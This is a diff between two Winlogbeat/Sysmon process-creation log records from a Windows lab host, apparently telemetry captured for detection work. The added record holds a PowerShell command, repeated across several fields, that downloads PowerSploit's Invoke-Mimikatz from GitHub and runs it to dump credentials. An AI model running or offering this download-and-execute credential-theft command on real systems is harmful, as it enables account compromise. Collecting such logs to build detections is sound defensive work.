@@ -1,9 +1,9 @@
 {
   "@timestamp": [
-    "2026-01-22T17:50:06.225Z"
+    "2026-01-30T17:42:37.513Z"
   ],
   "agent.ephemeral_id": [
-    "d9b5d734-d8fa-4e49-a6bf-e2613d9dfcd2"
+    "a4610d7c-f586-4ced-aae7-a4b9576712f0"
   ],
   "agent.hostname": [
     "DESKTOP-K1Q1TJA"
@@ -33,10 +33,10 @@
     "1"
   ],
   "event.created": [
-    "2026-01-22T17:50:08.138Z"
+    "2026-01-30T17:42:38.506Z"
   ],
   "event.ingested": [
-    "2026-01-22T17:50:08.721Z"
+    "2026-01-30T17:42:46.003Z"
   ],
   "event.kind": [
     "event"
@@ -60,10 +60,10 @@
     "0ac304ca-bfd2-429e-ac83-581c50bd0b8a"
   ],
   "host.ip": [
-    "2c0f:f290:3041:8245:ddbc:c8e0:ba2a:d5ff",
-    "2c0f:f290:3041:8245:6022:bca2:715c:a134",
+    "2c0f:f290:3002:1ac9:9517:7e83:ad54:be60",
+    "2c0f:f290:3002:1ac9:6057:448e:c3fa:e42",
     "fe80::4243:cfcf:9490:30b1",
-    "172.20.10.2"
+    "172.20.10.4"
   ],
   "host.mac": [
     "08-00-27-C1-A5-1D"
@@ -99,89 +99,89 @@
     "information"
   ],
   "message": [
-    "Process Create:\nRuleName: -\nUtcTime: 2026-01-22 17:50:06.225\nProcessGuid: {0AC304CA-634E-6972-0D02-000000001500}\nProcessId: 6016\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.19041.4355 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: \"cmd.exe\" /c assoc .hta=txtfile\nCurrentDirectory: C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\\nUser: DESKTOP-K1Q1TJA\\Administrator\nLogonGuid: {0AC304CA-630E-6972-CC22-690000000000}\nLogonId: 0x6922cc\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0\nParentProcessGuid: {0AC304CA-630E-6972-F501-000000001500}\nParentProcessId: 8196\nParentImage: C:\\Windows\\System32\\wsmprovhost.exe\nParentCommandLine: C:\\Windows\\system32\\wsmprovhost.exe -Embedding\nParentUser: DESKTOP-K1Q1TJA\\Administrator"
+    "Process Create:\nRuleName: -\nUtcTime: 2026-01-30 17:42:37.513\nProcessGuid: {0AC304CA-ED8D-697C-2401-000000002A00}\nProcessId: 1932\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell.exe  \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"\nCurrentDirectory: C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\\nUser: DESKTOP-K1Q1TJA\\Administrator\nLogonGuid: {0AC304CA-ED09-697C-3F74-160000000000}\nLogonId: 0x16743f\nTerminalSessionId: 0\nIntegrityLevel: High\nHashes: SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3\nParentProcessGuid: {0AC304CA-ED8D-697C-2201-000000002A00}\nParentProcessId: 1408\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: \"cmd.exe\" /c powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"\nParentUser: DESKTOP-K1Q1TJA\\Administrator"
   ],
   "process.args": [
-    "cmd.exe",
-    "/c",
-    "assoc",
-    ".hta=txtfile"
+    "powershell.exe",
+    "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
   ],
   "process.args_count": [
-    4
-  ],
-  "process.command_line": [
-    "\"cmd.exe\" /c assoc .hta=txtfile"
-  ],
-  "process.command_line.text": [
-    "\"cmd.exe\" /c assoc .hta=txtfile"
-  ],
-  "process.entity_id": [
-    "{0AC304CA-634E-6972-0D02-000000001500}"
-  ],
-  "process.executable": [
-    "C:\\Windows\\System32\\cmd.exe"
-  ],
-  "process.executable.text": [
-    "C:\\Windows\\System32\\cmd.exe"
-  ],
-  "process.hash.sha256": [
-    "badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0"
-  ],
-  "process.name": [
-    "cmd.exe"
-  ],
-  "process.name.text": [
-    "cmd.exe"
-  ],
-  "process.parent.args": [
-    "C:\\Windows\\system32\\wsmprovhost.exe",
-    "-Embedding"
-  ],
-  "process.parent.args_count": [
     2
   ],
+  "process.command_line": [
+    "powershell.exe  \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\""
+  ],
+  "process.command_line.text": [
+    "powershell.exe  \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\""
+  ],
+  "process.entity_id": [
+    "{0AC304CA-ED8D-697C-2401-000000002A00}"
+  ],
+  "process.executable": [
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  ],
+  "process.executable.text": [
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  ],
+  "process.hash.sha256": [
+    "9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
+  ],
+  "process.name": [
+    "powershell.exe"
+  ],
+  "process.name.text": [
+    "powershell.exe"
+  ],
+  "process.parent.args": [
+    "cmd.exe",
+    "/c",
+    "powershell.exe",
+    "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+  ],
+  "process.parent.args_count": [
+    4
+  ],
   "process.parent.command_line": [
-    "C:\\Windows\\system32\\wsmprovhost.exe -Embedding"
+    "\"cmd.exe\" /c powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\""
   ],
   "process.parent.command_line.text": [
-    "C:\\Windows\\system32\\wsmprovhost.exe -Embedding"
+    "\"cmd.exe\" /c powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\""
   ],
   "process.parent.entity_id": [
-    "{0AC304CA-630E-6972-F501-000000001500}"
+    "{0AC304CA-ED8D-697C-2201-000000002A00}"
   ],
   "process.parent.executable": [
-    "C:\\Windows\\System32\\wsmprovhost.exe"
+    "C:\\Windows\\System32\\cmd.exe"
   ],
   "process.parent.executable.text": [
-    "C:\\Windows\\System32\\wsmprovhost.exe"
+    "C:\\Windows\\System32\\cmd.exe"
   ],
   "process.parent.name": [
-    "wsmprovhost.exe"
+    "cmd.exe"
   ],
   "process.parent.name.text": [
-    "wsmprovhost.exe"
+    "cmd.exe"
   ],
   "process.parent.pid": [
-    8196
+    1408
   ],
   "process.pe.company": [
     "Microsoft Corporation"
   ],
   "process.pe.description": [
-    "Windows Command Processor"
+    "Windows PowerShell"
   ],
   "process.pe.file_version": [
-    "10.0.19041.4355 (WinBuild.160101.0800)"
+    "10.0.19041.3996 (WinBuild.160101.0800)"
   ],
   "process.pe.original_file_name": [
-    "Cmd.Exe"
+    "PowerShell.EXE"
   ],
   "process.pe.product": [
     "Microsoft® Windows® Operating System"
   ],
   "process.pid": [
-    6016
+    1932
   ],
   "process.working_directory": [
     "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\"
@@ -190,7 +190,7 @@
     "C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\"
   ],
   "related.hash": [
-    "badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0"
+    "9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3"
   ],
   "related.user": [
     "Administrator"
@@ -217,19 +217,19 @@
     "Microsoft Corporation"
   ],
   "winlog.event_data.Description": [
-    "Windows Command Processor"
+    "Windows PowerShell"
   ],
   "winlog.event_data.FileVersion": [
-    "10.0.19041.4355 (WinBuild.160101.0800)"
+    "10.0.19041.3996 (WinBuild.160101.0800)"
   ],
   "winlog.event_data.IntegrityLevel": [
     "High"
   ],
   "winlog.event_data.LogonGuid": [
-    "{0AC304CA-630E-6972-CC22-690000000000}"
+    "{0AC304CA-ED09-697C-3F74-160000000000}"
   ],
   "winlog.event_data.LogonId": [
-    "0x6922cc"
+    "0x16743f"
   ],
   "winlog.event_data.ParentUser": [
     "DESKTOP-K1Q1TJA\\Administrator"
@@ -247,10 +247,10 @@
     "Info"
   ],
   "winlog.process.pid": [
-    2104
+    2700
   ],
   "winlog.process.thread.id": [
-    2524
+    3932
   ],
   "winlog.provider_guid": [
     "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"
@@ -259,7 +259,7 @@
     "Microsoft-Windows-Sysmon"
   ],
   "winlog.record_id": [
-    "15442"
+    "29319"
   ],
   "winlog.task": [
     "Process Create (rule: ProcessCreate)"
@@ -279,7 +279,7 @@
   "winlog.version": [
     5
   ],
-  "_id": "RhbT5psBUqx14xSo8_lT",
+  "_id": "vZgAEJwBeTh8ZOEeEqox",
   "_index": ".ds-winlogbeat-9.2.3-2026.01.19-000001",
   "_score": null
 }
